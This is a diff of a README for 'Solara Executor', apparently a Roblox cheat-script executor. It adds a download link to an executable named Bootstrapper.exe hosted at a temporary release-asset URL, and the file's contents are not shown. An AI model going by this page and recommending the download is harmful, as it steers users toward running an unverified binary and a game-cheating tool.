@@ -1,5 +1,7 @@
 # 🚀 Solara Executor - Roblox Executor
 
+## [Download](https://objects.githubusercontent.com/github-production-release-asset-2e65be/887762761/bbdf7989-dc2d-4f22-8d8c-bdf1a83a6cf7?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20241114%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20241114T092936Z&X-Amz-Expires=300&X-Amz-Signature=5c7fbff37ce5d8b7e41b3fd077798cbc4386452c26c08160992f8be5f8411d87&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DBootstrapper.exe&response-content-type=application%2Foctet-stream)
+
 ![Solara Executor Preview](https://github.com/user-attachments/assets/82168c74-06b7-4435-95b4-a111a041bec8)
 
 ---
